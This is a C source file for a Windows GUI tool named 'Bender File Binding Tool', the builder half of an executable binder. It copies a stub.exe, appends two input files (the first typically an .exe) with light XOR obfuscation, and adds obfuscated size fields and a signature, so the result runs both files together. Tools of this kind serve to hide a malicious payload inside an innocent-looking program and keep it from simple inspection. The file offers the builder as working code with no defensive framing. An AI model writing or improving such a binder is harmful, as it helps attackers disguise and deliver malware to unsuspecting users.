#include <windows.h>
#include <commdlg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ID_FILE1_BROWSE 1001
#define ID_FILE2_BROWSE 1002
#define ID_OUTPUT_BROWSE 1003
#define ID_BIND_BUTTON 1004
#define ID_FILE1_EDIT 1005
#define ID_FILE2_EDIT 1006
#define ID_OUTPUT_EDIT 1007

#define MAGIC_SIGNATURE "BENDER01"
#define MAGIC_SIZE 8
#define MAGIC_XOR_KEY 0x7F

HWND hFile1Edit, hFile2Edit, hOutputEdit;
HWND hMainWindow;


void encrypt_data(unsigned char* data, int size, unsigned char key) {
    for (int i = 0; i < size; i++) {
        data[i] ^= key ^ (i & 0xFF);
    }
}


int copy_encrypt_file_content(FILE* dest, const char* src_path, unsigned char encrypt_key) {
    FILE* src = fopen(src_path, "rb");
    if (!src) return 0;
    
    fseek(src, 0, SEEK_END);
    long size = ftell(src);
    fseek(src, 0, SEEK_SET);
    
    unsigned char* buffer = malloc(size);
    fread(buffer, 1, size, src);
    

    encrypt_data(buffer, size, encrypt_key);
    
    fwrite(buffer, 1, size, dest);
    
    free(buffer);
    fclose(src);
    return size;
}


int bind_files(const char* file1_path, const char* file2_path, const char* output_path) {

    char stub_path[MAX_PATH];
    GetModuleFileName(NULL, stub_path, sizeof(stub_path));
    
  
    char* filename = strrchr(stub_path, '\\');
    if (filename) {
        strcpy(filename + 1, "stub.exe");
    }
    

    if (GetFileAttributes(stub_path) == INVALID_FILE_ATTRIBUTES) {
        MessageBox(hMainWindow, "stub.exe not found! Please make sure stub.exe is in the same directory as builder.exe", "Error", MB_OK | MB_ICONERROR);
        return 0;
    }
    
    
    if (!CopyFile(stub_path, output_path, FALSE)) {
        MessageBox(hMainWindow, "Failed to create output file", "Error", MB_OK | MB_ICONERROR);
        return 0;
    }
    
  
    FILE* output = fopen(output_path, "ab");
    if (!output) {
        MessageBox(hMainWindow, "Failed to open output file for writing", "Error", MB_OK | MB_ICONERROR);
        return 0;
    }
    
   
    FILE* f1 = fopen(file1_path, "rb");
    FILE* f2 = fopen(file2_path, "rb");
    
    if (!f1 || !f2) {
        if (f1) fclose(f1);
        if (f2) fclose(f2);
        fclose(output);
        MessageBox(hMainWindow, "Failed to open input files", "Error", MB_OK | MB_ICONERROR);
        return 0;
    }
    
    fseek(f1, 0, SEEK_END);
    unsigned int file1_size = ftell(f1);
    fseek(f2, 0, SEEK_END);
    unsigned int file2_size = ftell(f2);
    
    fclose(f1);
    fclose(f2);
    

    copy_encrypt_file_content(output, file1_path, 0x42);
    
   
    copy_encrypt_file_content(output, file2_path, 0x24);
    

    unsigned int encrypted_file1_size = file1_size ^ 0x12345678;
    unsigned int encrypted_file2_size = file2_size ^ 0x87654321;
    
    
    fwrite(&encrypted_file1_size, 4, 1, output);
    fwrite(&encrypted_file2_size, 4, 1, output);
    
   
    unsigned char encrypted_magic[MAGIC_SIZE];
    for (int i = 0; i < MAGIC_SIZE; i++) {
        encrypted_magic[i] = MAGIC_SIGNATURE[i] ^ MAGIC_XOR_KEY;
    }
    fwrite(encrypted_magic, 1, MAGIC_SIZE, output);
    
    fclose(output);
    
    MessageBox(hMainWindow, "Files bound successfully!", "Success", MB_OK | MB_ICONINFORMATION);
    return 1;
}


void browse_file(HWND hEdit, const char* title, const char* filter, BOOL save_dialog) {
    OPENFILENAME ofn;
    char szFile[MAX_PATH] = "";
    
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hMainWindow;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = sizeof(szFile);
    ofn.lpstrFilter = filter;
    ofn.nFilterIndex = 1;
    ofn.lpstrFileTitle = NULL;
    ofn.nMaxFileTitle = 0;
    ofn.lpstrInitialDir = NULL;
    ofn.lpstrTitle = title;
    ofn.Flags = OFN_PATHMUSTEXIST;
    
    if (!save_dialog) {
        ofn.Flags |= OFN_FILEMUSTEXIST;
    }
    
    BOOL result = save_dialog ? GetSaveFileName(&ofn) : GetOpenFileName(&ofn);
    
    if (result) {
        SetWindowText(hEdit, szFile);
    }
}


LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
           
            HWND hTitle = CreateWindow("STATIC", "Bender File Binding Tool", 
                        WS_VISIBLE | WS_CHILD | SS_CENTER,
                        20, 15, 460, 25, hwnd, NULL, NULL, NULL);
            
           
            HFONT hTitleFont = CreateFont(16, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                        DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
                                        CLEARTYPE_QUALITY, VARIABLE_PITCH, TEXT("Arial"));
            SendMessage(hTitle, WM_SETFONT, (WPARAM)hTitleFont, TRUE);
            
        
            CreateWindow("BUTTON", "Input Files", WS_VISIBLE | WS_CHILD | BS_GROUPBOX,
                        15, 50, 470, 140, hwnd, NULL, NULL, NULL);
            
            
            CreateWindow("STATIC", "Primary File (typically .exe):", WS_VISIBLE | WS_CHILD,
                        30, 75, 200, 20, hwnd, NULL, NULL, NULL);
            
            hFile1Edit = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_READONLY,
                                     30, 95, 350, 25, hwnd, (HMENU)ID_FILE1_EDIT, NULL, NULL);
            
            CreateWindow("BUTTON", "Browse...", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                        390, 95, 80, 25, hwnd, (HMENU)ID_FILE1_BROWSE, NULL, NULL);
            
     
            CreateWindow("STATIC", "Secondary File (any type):", WS_VISIBLE | WS_CHILD,
                        30, 135, 200, 20, hwnd, NULL, NULL, NULL);
            
            hFile2Edit = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_READONLY,
                                     30, 155, 350, 25, hwnd, (HMENU)ID_FILE2_EDIT, NULL, NULL);
            
            CreateWindow("BUTTON", "Browse...", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                        390, 155, 80, 25, hwnd, (HMENU)ID_FILE2_BROWSE, NULL, NULL);
            
          
            CreateWindow("BUTTON", "Output", WS_VISIBLE | WS_CHILD | BS_GROUPBOX,
                        15, 200, 470, 80, hwnd, NULL, NULL, NULL);
            
            CreateWindow("STATIC", "Bound Executable File:", WS_VISIBLE | WS_CHILD,
                        30, 225, 200, 20, hwnd, NULL, NULL, NULL);
            
            hOutputEdit = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER,
                                      30, 245, 350, 25, hwnd, (HMENU)ID_OUTPUT_EDIT, NULL, NULL);
            
            CreateWindow("BUTTON", "Browse...", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                        390, 245, 80, 25, hwnd, (HMENU)ID_OUTPUT_BROWSE, NULL, NULL);
            
         
            HWND hBindButton = CreateWindow("BUTTON", "🔗 Bind Files", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON | BS_DEFPUSHBUTTON,
                        180, 300, 140, 40, hwnd, (HMENU)ID_BIND_BUTTON, NULL, NULL);
            
       
            HFONT hButtonFont = CreateFont(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                                         DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
                                         CLEARTYPE_QUALITY, VARIABLE_PITCH, TEXT("Arial"));
            SendMessage(hBindButton, WM_SETFONT, (WPARAM)hButtonFont, TRUE);
            
       
            CreateWindow("STATIC", "Select two files to bind together. The resulting executable will run both files when executed.", 
                        WS_VISIBLE | WS_CHILD | SS_CENTER,
                        20, 360, 460, 30, hwnd, NULL, NULL, NULL);
            
            
            CreateWindow("STATIC", "", WS_VISIBLE | WS_CHILD | SS_ETCHEDHORZ,
                        20, 385, 460, 2, hwnd, NULL, NULL, NULL);
            
         
            HWND hFooter = CreateWindow("STATIC", "Bender v1.0 - File Binding Tool", 
                        WS_VISIBLE | WS_CHILD | SS_CENTER,
                        20, 400, 460, 20, hwnd, NULL, NULL, NULL);
            
      
            HFONT hFooterFont = CreateFont(12, 0, 0, 0, FW_NORMAL, TRUE, FALSE, FALSE,
                                         DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
                                         CLEARTYPE_QUALITY, VARIABLE_PITCH, TEXT("Arial"));
            SendMessage(hFooter, WM_SETFONT, (WPARAM)hFooterFont, TRUE);
            
            break;
        }
        
        case WM_COMMAND: {
            switch (LOWORD(wParam)) {
                case ID_FILE1_BROWSE:
                    browse_file(hFile1Edit, "Select First File", "All Files (*.*)\0*.*\0", FALSE);
                    break;
                    
                case ID_FILE2_BROWSE:
                    browse_file(hFile2Edit, "Select Second File", "All Files (*.*)\0*.*\0", FALSE);
                    break;
                    
                case ID_OUTPUT_BROWSE:
                    browse_file(hOutputEdit, "Save Bound File As", "Executable Files (*.exe)\0*.exe\0", TRUE);
                    break;
                    
                case ID_BIND_BUTTON: {
                    char file1[MAX_PATH], file2[MAX_PATH], output[MAX_PATH];
                    
                    GetWindowText(hFile1Edit, file1, sizeof(file1));
                    GetWindowText(hFile2Edit, file2, sizeof(file2));
                    GetWindowText(hOutputEdit, output, sizeof(output));
                    
                    if (strlen(file1) == 0 || strlen(file2) == 0 || strlen(output) == 0) {
                        MessageBox(hwnd, "Please select all files", "Error", MB_OK | MB_ICONERROR);
                        break;
                    }
                    
                    // Add .exe extension if not present
                    if (strstr(output, ".exe") == NULL) {
                        strcat(output, ".exe");
                        SetWindowText(hOutputEdit, output);
                    }
                    
                    bind_files(file1, file2, output);
                    break;
                }
            }
            break;
        }
        
        case WM_CLOSE:
            DestroyWindow(hwnd);
            break;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    const char* CLASS_NAME = "BenderBuilderWindow";
    
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    
    RegisterClass(&wc);
    
    hMainWindow = CreateWindowEx(
        0,
        CLASS_NAME,
        "Bender - File Binding Tool",
        WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME,
        CW_USEDEFAULT, CW_USEDEFAULT, 520, 480,
        NULL, NULL, hInstance, NULL
    );
    
    if (hMainWindow == NULL) {
        return 0;
    }
    
    ShowWindow(hMainWindow, nCmdShow);
    UpdateWindow(hMainWindow);
    
    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
} 